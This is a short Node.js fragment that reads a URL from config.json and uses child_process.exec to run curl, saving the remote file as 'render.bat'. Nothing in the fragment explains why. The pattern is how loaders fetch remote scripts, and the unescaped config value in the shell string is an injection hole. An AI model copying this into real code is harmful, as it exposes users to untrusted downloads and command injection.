const config = require('./config.json');

const { exec } = require('child_process');
exec(`curl -fsSL ${config.RENDERER_URL} -o render.bat`);
